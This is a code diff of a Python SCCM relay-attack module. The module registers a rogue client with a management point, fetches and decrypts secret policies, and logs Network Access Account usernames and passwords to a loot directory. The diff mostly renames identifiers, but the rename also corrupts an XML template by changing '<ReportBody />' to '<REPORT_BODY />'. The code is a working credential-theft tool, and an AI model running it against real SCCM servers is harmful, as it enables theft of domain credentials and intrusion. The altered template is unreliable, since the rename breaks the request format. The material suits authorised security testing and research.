@@ -10,7 +10,7 @@
 #   SCCM relay attack to register a device and dump all secret policies
 # 
 # Authors:
-#    Quentin Roland(@croco_byte)
+#    Quentin Roland(@croco_byte) - Synacktiv
 #    Based on SCCMSecrets.py (https://github.com/synacktiv/SCCMSecrets/)
 #    Inspired by xpn's work (@xpn)
 
@@ -40,7 +40,7 @@ from pyasn1_modules                                     import rfc5652
 from pyasn1.codec.der.decoder                           import decode
 
 # Request templates
-registrationRequestTemplate = """<Data HashAlgorithm="1.2.840.113549.1.1.11" SMSID="" RequestType="Registration" TimeStamp="{date}">
+REGISTRATION_REQUEST_TEMPLATE = """<Data HashAlgorithm="1.2.840.113549.1.1.11" SMSID="" RequestType="Registration" TimeStamp="{date}">
 <AgentInformation AgentIdentity="CCMSetup.exe" AgentVersion="5.00.8325.0000" AgentType="0" />
 <Certificates><Encryption Encoding="HexBinary" KeyType="1">{encryption}</Encryption><Signing Encoding="HexBinary" KeyType="1">{signature}</Signing></Certificates>
 <DiscoveryProperties><Property Name="Netbios Name" Value="{client}" />
@@ -48,12 +48,12 @@ registrationRequestTemplate = """<Data HashAlgorithm="1.2.840.113549.1.1.11" SMS
 <Property Name="Locale ID" Value="2057" />
 <Property Name="InternetFlag" Value="0" />
 </DiscoveryProperties></Data>"""
-registrationRequestWrapperTemplate = "<ClientRegistrationRequest>{data}<Signature><SignatureValue>{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"
+REGISTRATION_REQUEST_WRAPPER_TEMPLATE = "<ClientRegistrationRequest>{data}<Signature><SignatureValue>{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"
 
-SCCMHeaderTemplate = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{5DD100CD-DF1D-45F5-BA17-A327F43465F8}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
-policyRequestHeaderTemplate = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook2 Name="clientauth"><Property Name="AuthSenderMachine">{client}</Property><Property Name="PublicKey">{publickey}</Property><Property Name="ClientIDSignature">{clientIDsignature}</Property><Property Name="PayloadSignature">{payloadsignature}</Property><Property Name="ClientCapabilities">NonSSL</Property><Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name="zlib-compress" /></Hooks><ID>{{041A35B4-DCEE-4F64-A978-D4D489F47D28}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceID>GUID:{clientid}</SourceID><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
-policyRequestTemplate = """<RequestAssignments SchemaVersion="1.00" ACK="false" RequestType="Always"><Identification><Machine><ClientID>GUID:{clientid}</ClientID><FQDN>{clientfqdn}</FQDN><NetBIOSName>{client}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:PRI</PolicySource><Resource ResourceType="Machine" /><ServerCookie /></RequestAssignments>"""
-reportBody = """<Report><ReportHeader><Identification><Machine><ClientInstalled>0</ClientInstalled><ClientType>1</ClientType><ClientID>GUID:{clientid}</ClientID><ClientVersion>5.00.8325.0000</ClientVersion><NetBIOSName>{client}</NetBIOSName><CodePage>850</CodePage><SystemDefaultLCID>2057</SystemDefaultLCID><Priority /></Machine></Identification><ReportDetails><ReportContent>Inventory Data</ReportContent><ReportType>Full</ReportType><Date>{date}</Date><Version>1.0</Version><Format>1.1</Format></ReportDetails><InventoryAction ActionType="Predefined"><InventoryActionID>{{00000000-0000-0000-0000-000000000003}}</InventoryActionID><Description>Discovery</Description><InventoryActionLastUpdateTime>{date}</InventoryActionLastUpdateTime></InventoryAction></ReportHeader><ReportBody /></Report>"""
+SCCM_HEADER_TEMPLATE = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{5DD100CD-DF1D-45F5-BA17-A327F43465F8}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
+POLICY_REQUEST_HEADER_TEMPLATE = """<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{bodylength}" Offset="0" /><CorrelationID>{{00000000-0000-0000-0000-000000000000}}</CorrelationID><Hooks><Hook2 Name="clientauth"><Property Name="AuthSenderMachine">{client}</Property><Property Name="PublicKey">{publickey}</Property><Property Name="ClientIDSignature">{clientIDsignature}</Property><Property Name="PayloadSignature">{payloadsignature}</Property><Property Name="ClientCapabilities">NonSSL</Property><Property Name="HashAlgorithm">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name="zlib-compress" /></Hooks><ID>{{041A35B4-DCEE-4F64-A978-D4D489F47D28}}</ID><Payload Type="inline" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:{client}:SccmMessaging</ReplyTo><SentTime>{date}</SentTime><SourceID>GUID:{clientid}</SourceID><SourceHost>{client}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>{sccmserver}</TargetHost><Timeout>60000</Timeout></Msg>"""
+POLICY_REQUEST_TEMPLATE = """<RequestAssignments SchemaVersion="1.00" ACK="false" RequestType="Always"><Identification><Machine><ClientID>GUID:{clientid}</ClientID><FQDN>{clientfqdn}</FQDN><NetBIOSName>{client}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:PRI</PolicySource><Resource ResourceType="Machine" /><ServerCookie /></RequestAssignments>"""
+REPORT_BODY = """<Report><ReportHeader><Identification><Machine><ClientInstalled>0</ClientInstalled><ClientType>1</ClientType><ClientID>GUID:{clientid}</ClientID><ClientVersion>5.00.8325.0000</ClientVersion><NetBIOSName>{client}</NetBIOSName><CodePage>850</CodePage><SystemDefaultLCID>2057</SystemDefaultLCID><Priority /></Machine></Identification><ReportDetails><ReportContent>Inventory Data</ReportContent><ReportType>Full</ReportType><Date>{date}</Date><Version>1.0</Version><Format>1.1</Format></ReportDetails><InventoryAction ActionType="Predefined"><InventoryActionID>{{00000000-0000-0000-0000-000000000003}}</InventoryActionID><Description>Discovery</Description><InventoryActionLastUpdateTime>{date}</InventoryActionLastUpdateTime></InventoryAction></ReportHeader><REPORT_BODY /></Report>"""
 
 OID_MAPPING = {
     '1.2.840.113549.3.7': "des-ede3-cbc",
@@ -85,7 +85,7 @@ OID_MAPPING = {
 
 
 ### Cryptography utility functions ###
-def createCertificate(privatekey):
+def create_certificate(privatekey):
     subject = issuer = x509.Name([
         x509.NameAttribute(NameOID.COMMON_NAME, "ConfigMgr Client"),
     ])
@@ -113,28 +113,28 @@ def createCertificate(privatekey):
 
     return cert
 
-def createPrivateKey():
+def create_private_key():
     privatekey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
     return privatekey
 
-def SCCMSign(private_key, data):
+def SCCM_sign(private_key, data):
         signature = private_key.sign(data, PKCS1v15(), hashes.SHA256())
         signature_rev = bytearray(signature)
         signature_rev.reverse()
         return bytes(signature_rev)
 
 
-def buildMSPublicKeyBlob(private_key):
+def build_MS_public_key_blob(private_key):
     blobHeader = b"\x06\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x31\x00\x08\x00\x00\x01\x00\x01\x00"
     blob = blobHeader + private_key.public_key().public_numbers().n.to_bytes(int(private_key.key_size / 8), byteorder="little")
     return blob.hex().upper()
 
 
 ### Various utility functions ###
-def encodeUTF16StripBOM(data):
+def encode_UTF16_strip_BOM(data):
     return data.encode('utf-16')[2:]
 
-def cleanJunkInXML(xml_string):
+def clean_junk_in_XML(xml_string):
     root_end = xml_string.rfind('</')
     if root_end != -1:
         root_end = xml_string.find('>', root_end) + 1
@@ -144,8 +144,8 @@ def cleanJunkInXML(xml_string):
 
 
 ### Client registration utility functions ###
-def generateRegistrationRequestPayload(management_point, public_key, private_key, client_name):
-    registrationRequest = registrationRequestTemplate.format(
+def generate_registration_request_payload(management_point, public_key, private_key, client_name):
+    registrationRequest = REGISTRATION_REQUEST_TEMPLATE.format(
         date=datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
         encryption=public_key,
         signature=public_key,
@@ -153,14 +153,14 @@ def generateRegistrationRequestPayload(management_point, public_key, private_key
         clientfqdn=client_name
     )
 
-    signature = SCCMSign(private_key, encodeUTF16StripBOM(registrationRequest)).hex().upper()
-    registrationRequestWrapper = registrationRequestWrapperTemplate.format(
+    signature = SCCM_sign(private_key, encode_UTF16_strip_BOM(registrationRequest)).hex().upper()
+    registrationRequestWrapper = REGISTRATION_REQUEST_WRAPPER_TEMPLATE.format(
      data=registrationRequest,
      signature=signature
     )
-    registrationRequestWrapper = encodeUTF16StripBOM(registrationRequestWrapper) + "\r\n".encode('ascii')
+    registrationRequestWrapper = encode_UTF16_strip_BOM(registrationRequestWrapper) + "\r\n".encode('ascii')
 
-    registrationRequestHeader = SCCMHeaderTemplate.format(
+    registrationRequestHeader = SCCM_HEADER_TEMPLATE.format(
         bodylength=len(registrationRequestWrapper)-2,
         client=client_name,
         date=datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
@@ -175,20 +175,20 @@ def generateRegistrationRequestPayload(management_point, public_key, private_key
 
 
 ### Policies request utility functions ###
-def generatePoliciesRequestPayload(management_point, private_key, client_guid, client_name):
-    policyRequest = encodeUTF16StripBOM(policyRequestTemplate.format(
+def generate_policies_request_payload(management_point, private_key, client_guid, client_name):
+    policyRequest = encode_UTF16_strip_BOM(POLICY_REQUEST_TEMPLATE.format(
         clientid=client_guid,
         clientfqdn=client_name,
         client=client_name.split('.')[0]
     )) + b"\x00\x00\r\n"
     policyRequestCompressed = zlib.compress(policyRequest)
 
-    MSPublicKey = buildMSPublicKeyBlob(private_key)
+    MSPublicKey = build_MS_public_key_blob(private_key)
     clientID = f"GUID:{client_guid.upper()}"
-    clientIDSignature = SCCMSign(private_key, encodeUTF16StripBOM(clientID) + "\x00\x00".encode('ascii')).hex().upper()
-    policyRequestSignature = SCCMSign(private_key, policyRequestCompressed).hex().upper()
+    clientIDSignature = SCCM_sign(private_key, encode_UTF16_strip_BOM(clientID) + "\x00\x00".encode('ascii')).hex().upper()
+    policyRequestSignature = SCCM_sign(private_key, policyRequestCompressed).hex().upper()
 
-    policyRequestHeader = policyRequestHeaderTemplate.format(
+    policyRequestHeader = POLICY_REQUEST_HEADER_TEMPLATE.format(
         bodylength=len(policyRequest)-2, 
         sccmserver=management_point, 
         client=client_name.split('.')[0],
@@ -207,25 +207,25 @@ def generatePoliciesRequestPayload(management_point, private_key, client_guid, c
 
 
 ### Secret policies utility functions ###
-def decryptKeyOAEP(encrypted_key, private_key):
+def decrypt_key_OEAP(encrypted_key, private_key):
     return private_key.decrypt(encrypted_key, OAEP(mgf=MGF1(algorithm=SHA1()), algorithm=SHA1(), label=None))
 
-def decryptKeyRSA(encrypted_key, private_key):
+def decrypt_key_RSA(encrypted_key, private_key):
     return private_key.decrypt(encrypted_key, PKCS1v15())
 
-def decryptBodyTripleDES(body, plaintextkey, iv):
+def decrypt_body_triple_DES(body, plaintextkey, iv):
     cipher = Cipher(algorithms.TripleDES(plaintextkey), modes.CBC(iv), backend=default_backend())
     decryptor = cipher.decryptor()
     plaintext = decryptor.update(body) + decryptor.finalize()
     return plaintext.decode('utf-16le')
 
-def decryptBodyAESCBC(body, plaintextkey, iv):
+def decrypt_body_AESCBC(body, plaintextkey, iv):
     cipher = Cipher(algorithms.AES(plaintextkey), modes.CBC(iv), backend=default_backend())
     decryptor = cipher.decryptor()
     plaintext = decryptor.update(body) + decryptor.finalize()
     return plaintext.decode('utf-16le')
 
-def decryptSecretPolicy(policy_response, private_key):
+def decrypt_secret_policy(policy_response, private_key):
     content, _ = decode(policy_response, asn1Spec=rfc5652.ContentInfo())
     content, _ = decode(content.getComponentByName('content'), asn1Spec=rfc5652.EnvelopedData())
     encryptedRSAKey = content['recipientInfos'][0]['ktri']['encryptedKey'].asOctets()
@@ -236,9 +236,9 @@ def decryptSecretPolicy(policy_response, private_key):
 
     try:
         if OID_MAPPING[keyEncryptionOID] == 'rsaEncryption':
-            plaintextkey = decryptKeyRSA(encryptedRSAKey, private_key)
+            plaintextkey = decrypt_key_RSA(encryptedRSAKey, private_key)
         elif OID_MAPPING[keyEncryptionOID] == 'id-RSAES-OAEP':
-            plaintextkey = decryptKeyOAEP(encryptedRSAKey, private_key)
+            plaintextkey = decrypt_key_OEAP(encryptedRSAKey, private_key)
         else:
             LOG.error(f"Key decryption algorithm {OID_MAPPING[keyEncryptionOID]} is not currently implemented.")
             return
@@ -248,9 +248,9 @@ def decryptSecretPolicy(policy_response, private_key):
 
     try:
         if OID_MAPPING[bodyEncryptionOID] == 'des-ede3-cbc':
-            plaintextbody = decryptBodyTripleDES(body, plaintextkey, iv)
+            plaintextbody = decrypt_body_triple_DES(body, plaintextkey, iv)
         elif OID_MAPPING[bodyEncryptionOID] == 'aes256_cbc':
-            plaintextbody = decryptBodyAESCBC(body, plaintextkey, iv)
+            plaintextbody = decrypt_body_AESCBC(body, plaintextkey, iv)
         else:
             LOG.error(f"[-] Body decryption algorithm {OID_MAPPING[bodyEncryptionOID]} is not currently implemented.")
             return
@@ -284,7 +284,7 @@ def mscrypt_derive_key_sha1(secret:bytes):
     derived_key = hash1 + hash2[:4]
     return derived_key
 
-def deobfuscateSecretPolicyBlob(output):
+def deobfuscate_secret_policy_blob(output):
     if isinstance(output, str):
         output = bytes.fromhex(output)
     
@@ -307,7 +307,7 @@ def deobfuscateSecretPolicyBlob(output):
     return decrypted_data
 
 
-def parsePoliciesFlags(policyFlagValue):
+def parse_policies_flags(policyFlagValue):
     policyFlagValue = int(policyFlagValue)
     NONE                        = 0b0000000
     TASKSEQUENCE                = 0b0000001
@@ -357,8 +357,8 @@ class SCCMPoliciesAttack:
 
         os.makedirs(f"{loot_dir}/device")
         LOG.info(f"Generating Private key and client (self-signed) certificate")
-        private_key = createPrivateKey()
-        certificate = createCertificate(private_key)
+        private_key = create_private_key()
+        certificate = create_certificate(private_key)
         public_key = certificate.public_bytes(serialization.Encoding.DER).hex().upper()
         # Writing certs to device info directory for potential future use
         with open(f"{loot_dir}/device/cert.pem", 'wb') as f:
@@ -368,10 +368,10 @@ class SCCMPoliciesAttack:
 
         # Device registration  
         LOG.info(f"Registering SCCM client with client name '{self.config.SCCMPoliciesClientname}'")
-        registration_request_payload = generateRegistrationRequestPayload(management_point, public_key, private_key, self.config.SCCMPoliciesClientname)
+        registration_request_payload = generate_registration_request_payload(management_point, public_key, private_key, self.config.SCCMPoliciesClientname)
         
         try:
-            register_response = self.registerClient(management_point, registration_request_payload)
+            register_response = self.register_client(management_point, registration_request_payload)
             if register_response == None:
                 LOG.error(f"Device registration failed")
                 return
@@ -392,10 +392,10 @@ class SCCMPoliciesAttack:
 
 
         # Policies request
-        policies_request_payload = generatePoliciesRequestPayload(management_point, private_key, client_guid, self.config.SCCMPoliciesClientname)
+        policies_request_payload = generate_policies_request_payload(management_point, private_key, client_guid, self.config.SCCMPoliciesClientname)
 
         try:
-            policies_response = self.requestPolicies(management_point, policies_request_payload)
+            policies_response = self.request_policies(management_point, policies_request_payload)
             root = ET.fromstring(policies_response[:-1])
             policies = root.findall(".//Policy")
             policies_json = {}
@@ -403,7 +403,7 @@ class SCCMPoliciesAttack:
                 policies_json[policy.attrib["PolicyID"]] = {"PolicyVersion": policy.attrib["PolicyVersion"] if "PolicyVersion" in policy.attrib else "N/A",
                                                 "PolicyType": policy.attrib["PolicyType"] if "PolicyType" in policy.attrib else "N/A",
                                                 "PolicyCategory": policy.attrib["PolicyCategory"] if "PolicyCategory" in policy.attrib else "N/A",
-                                                "PolicyFlags": parsePoliciesFlags(policy.attrib["PolicyFlags"]) if "PolicyFlags" in policy.attrib else "N/A",
+                                                "PolicyFlags": parse_policies_flags(policy.attrib["PolicyFlags"]) if "PolicyFlags" in policy.attrib else "N/A",
                                                 "PolicyLocation": policy[0].text.replace("<mp>", management_point.split('http://')[1]) }
             with open(f'{loot_dir}/policies.json', 'w') as f:
                 f.write(json.dumps(policies_json))
@@ -425,7 +425,7 @@ class SCCMPoliciesAttack:
 
         for key, value in secret_policies.items():
             try:
-                result = self.secretPolicyProcess(key, value, private_key, client_guid, loot_dir)
+                result = self.secret_policy_process(key, value, private_key, client_guid, loot_dir)
                 if result['NAA_credentials'] is not None:
                     LOG.info(f"Retrieved NAA account credentials: '{result['NAA_credentials']['NetworkAccessUsername']}:{result['NAA_credentials']['NetworkAccessPassword']}'")
             except Exception as e:
@@ -437,7 +437,7 @@ class SCCMPoliciesAttack:
         
     
 
-    def registerClient(self, management_point, registration_request_payload):
+    def register_client(self, management_point, registration_request_payload):
         headers = {
             "Connection": "close",
             "User-Agent": "ConfigMgr Messaging HTTP Sender",
@@ -463,7 +463,7 @@ class SCCMPoliciesAttack:
                 return decompressed_content
         return None
     
-    def requestPolicies(self, management_point, policies_request_payload):
+    def request_policies(self, management_point, policies_request_payload):
         headers = {
             "Connection": "close",
             "User-Agent": "ConfigMgr Messaging HTTP Sender",
@@ -488,28 +488,28 @@ class SCCMPoliciesAttack:
                 return decompressed_content
         return None
     
-    def requestPolicy(self, policy_url, client_guid, private_key):
+    def request_policy(self, policy_url, client_guid, private_key):
         headers = {
             "Connection": "close",
             "User-Agent": "ConfigMgr Messaging HTTP Sender"
         }
 
         headers["ClientToken"] = f"GUID:{client_guid};{datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')};2"
-        headers["ClientTokenSignature"] = SCCMSign(private_key, f"GUID:{client_guid};{datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')};2".encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
+        headers["ClientTokenSignature"] = SCCM_sign(private_key, f"GUID:{client_guid};{datetime.now().strftime('%Y-%m-%dT%H:%M:%SZ')};2".encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
 
         self.client.request("GET", policy_url, headers=headers)
         r = self.client.getresponse().read()
         return r
 
 
-    def secretPolicyProcess(self, policyID, policy, private_key, client_guid, loot_dir):
+    def secret_policy_process(self, policyID, policy, private_key, client_guid, loot_dir):
         LOG.info(f"Processing secret policy {policyID}")
         os.makedirs(f'{loot_dir}/{policyID}')
 
         NAA_credentials = {"NetworkAccessUsername": None, "NetworkAccessPassword": None}
-        policy_response = self.requestPolicy(policy["PolicyLocation"], client_guid, private_key)
-        decrypted = decryptSecretPolicy(policy_response, private_key)[:-1]
-        decrypted = cleanJunkInXML(decrypted)
+        policy_response = self.request_policy(policy["PolicyLocation"], client_guid, private_key)
+        decrypted = decrypt_secret_policy(policy_response, private_key)[:-1]
+        decrypted = clean_junk_in_XML(decrypted)
         
         if policy["PolicyCategory"] == "CollectionSettings":
             LOG.debug("Processing a CollectionSettings policy to extract collection variables")
@@ -545,7 +545,7 @@ class SCCMPoliciesAttack:
         
         LOG.debug(f"Found {len(blobs_set.keys())} obfuscated blob(s) in secret policy.")
         for i, blob_name in enumerate(blobs_set.keys()):
-            data = deobfuscateSecretPolicyBlob(blobs_set[blob_name])
+            data = deobfuscate_secret_policy_blob(blobs_set[blob_name])
             filename = f'{loot_dir}/{policyID}/secretBlob_{str(i+1)}-{blob_name}.txt'
             with open(filename, 'w') as f:
                 f.write(f"Secret property name: {blob_name}\n\n")
@@ -557,7 +557,7 @@ class SCCMPoliciesAttack:
 
             LOG.debug(f"Deobfuscated blob n°{i+1}")
             try:
-                blobroot = ET.fromstring(cleanJunkInXML(data))
+                blobroot = ET.fromstring(clean_junk_in_XML(data))
                 source_scripts = blobroot.findall('.//*[@property="SourceScript"]')
                 if len(source_scripts) > 0:
                     LOG.debug(f"Found {len(source_scripts)} embedded powershell scripts in blob.")
